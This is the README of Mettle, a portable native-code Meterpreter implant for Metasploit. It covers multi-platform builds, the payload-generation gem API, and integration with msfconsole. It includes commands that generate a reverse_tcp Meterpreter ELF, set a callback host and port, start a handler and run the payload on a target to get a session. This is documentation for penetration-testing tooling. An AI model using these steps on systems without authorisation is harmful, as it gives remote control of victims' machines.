# Mettle

This is an implementation of a native-code Meterpreter, designed for  portability, embeddability, and low resource 
utilization. It can run on the smallest embedded Linux targets to big iron, and targets Android, iOS, macOS, Linux, and 
Windows, but can be ported to almost any POSIX-compliant environment.

## Building on Linux

Debain, Ubuntu, and derivatives are most supported for builds. To build, you need at least 5GB of free disk space, and 
the following packages available:

```
# Dependencies
apt install curl build-essential git autoconf automake libtool bison flex gcc ruby rake bundler git mingw-w64
```

The Dockerfile under docker/Dockerfile contains a pre-configured build environment as well.

## Building on macOS

On macOS you will need to install the xcode command line tools as follows:

```
xcode-select --install
```

## Make Targets

For general development, there are a few make targets defined:

Running `make` will build for the local environment. E.g. if you're on macOS,it will build for macOS using your native 
compiler and tools.

`make TARGET=triple` will build for a specific host triple. See below for some common ones.

`make clean` will clean the 'mettle' directory for the current build target

`make distclean` will clean the entire build target`

`make all-parallel` will build for every known target, useful with '-j' to build multiple targets at once.

`make clean-parallel` and `make distclean-parallel` do similar for all targets.

# Packaging

To build the gem for distribution (currently requires Linux or macOS):

```
rake build
```

To check the resulting binaries:

```
rake check
```

To completely reset your dev environment and delete all binary artifacts:

```
rake mettle:ultraclean
```

## Gem API

To generate a payload with Mettle:
```ruby
mettle = MetasploitPayloads::Mettle.new(platform_triple, config={})
```

The available platform triples for Linux targets are:

* `aarch64-linux-musl`
* `armv5l-linux-musleabi`
* `armv5b-linux-musleabi`
* `i486-linux-musl`
* `x86_64-linux-musl`
* `powerpc-linux-muslsf`
* `powerpc64le-linux-musl`
* `mips-linux-muslsf`
* `mipsel-linux-muslsf`
* `mips64-linux-muslsf`
* `s390x-linux-musl`

For Mingw32-64 Windows targets, the following triples are added. On up-to-date Debian / Ubuntu systems, the `mingw-w64` 
package will install both toolchains.

* `x86_64-w64-mingw32`
* `i686-w64-mingw32`

For macOS/iOS builds, the following triples are added. To target older macOS/OSX versions, see 
https://github.com/phracker/MacOSX-SDKs to get the appropriate SDK folder.

* `arm-iphone-darwin`
* `aarch64-iphone-darwin`
* `i386-apple-darwin`
* `x86_64-apple-darwin`
* `aarch64-apple-darwin`

Available config options are:
* `:background` - fork to background as a daemon
* `:debug` - to turn on debug messages
* `:log_file` - the file to send debug messages to instead of `stderr`
* `:uri` - the uri to connect back to
* `:uuid` - the UUID to identify the payload

Config options can also be set with:
```ruby
mettle.config[:key] = val
```

To get a binary with installed options call:
```ruby
mettle.to_binary(format=:process_image)
```

The formats are:
* `:exec` - a standalone executable that can take command-line arguments (see `mettle -h`) or use pre-set ones
* `:process_image` - a process image that must be started with a custom stack (see `doc/stack_requirements.md`)


## Using with Metasploit

To pull your local changes of mettle into your Metasploit install:

1. Add `-dev` to the version in `lib/metasploit_payloads/mettle/version.rb`:
```
# -*- coding:binary -*- 
module MetasploitPayloads 
  VERSION = '1.0.28-dev'

  def self.version 
    VERSION 
  end 
end
```
2. Build the gem with:
```
rake build 
```
3. Copy `pkg/metasploit-payloads-mettle-X.X.X.pre.dev.gem` to the box you are using for Metasploit if it is different
4. Change the version in your `metasploit-framework.gemspec` to match the one you just built:
```
spec.add_runtime_dependency 'metasploit_payloads-mettle', '1.0.28-dev'
```  
5. `gem install <path to new gem>` (for example: 'metasploit_payloads-mettle', '0.4.1.pre.dev')
```
gem install metasploit_payloads-mettle-1.0.28.pre.dev.gem 
```
6. Run `bundle install` in your Framework directory, and ensure you see something like the following in the output:
```
Using metasploit_payloads-mettle 1.0.28.pre.dev (was 1.0.26)
```

Within `msfconsole`:
7. Use an appropriate payload:
```
use payload/linux/x64/meterpreter/reverse_tcp 
```

8. Generate the payload:
```
generate -f elf -o mettle.elf
```

9. Change the file permissions:

```
chmod +x mettle.elf
```

10. Set up a handler
```
to_handler
```

11. Move the payload to the target machine and run it, you should now get back a session on `msfconsole`!


## Docker
The following is to get Mettle set up locally via Docker and generate a payload.
1. Mount the Docker container within the Mettle directory:
```
sudo docker run -it -v $(pwd):$(pwd) -w $(pwd) rapid7/build:mettle /bin/bash
```
2.
Once the Docker container is up and running, run the `make-all` command:
```
./make-all
```

3. Then run `rake-build`:
```
rake build
```

4. Copy the gem that was output via `rake-build`, this will be found in
`pkg/metasploit_payloads-mettle-1.0.28.pre.dev.gem`. Add this into your Metasploit-Framework directory.

5. Update `metasploit-framework.gemspec` and add `-dev` with the version of the gem above:
```
  spec.add_runtime_dependency 'metasploit_payloads-mettle', '1.0.28-dev'
```

6. Now within your Metasploit Framework directory, run the following commands:
```
gem install metasploit_payloads-mettle-1.0.28.pre.dev.gem

bundle install
```

7. Now you are able to generate the payload as normal - example of a linux target:
```
use linux/x64/meterpreter/reverse_tcp

set LHOST xxx.xxx.xxx.xxx
set LPORT 4444

generate -f elf -o mettle.elf

chmod +x ./mettle.elf

to_handler
```

### Docker with debugging
The following steps make use of `gdb` for debugging.
1. Run the Docker container:
```
sudo docker run -it -v $(pwd):$(pwd) -w $(pwd) rapid7/build:mettle /bin/bash
```

2. Within the container run the following commands:
```
sudo apt-get update
sudo apt-get install gdb
```

3. Compile(`D=1` enables debugging):
```
make clean

make D=1
```

4. Then run with `gdb`:
```
gdb --args /home/ubuntu/code/mettle/build/linux.x86_64/bin/mettle --debug 3 --uri "tcp://192.168.175.1:4444"
```

5. Once within `gdb` run the following commands:
```
b *main

 run
```

6. To get breakpoint in `gbd` add the following into your code:
```
__asm("int3");
```

### TUI
[TUI](https://sourceware.org/gdb/current/onlinedocs/gdb.html/TUI.html) allows `gdb` to show the code above the terminal
for easier code traversal when debugging. _Note_ TUI will remove use of arrows for navigating console history.

## Pushing out a New Gem

Build CI will automatically publish new gems when commits land to master and pass build.
1. Test Locally
2. Land the changes to upstream master
3. Monitor for the new gem on rubygems.org
4. Once the gem appears, make a PR for bumping the version in framework
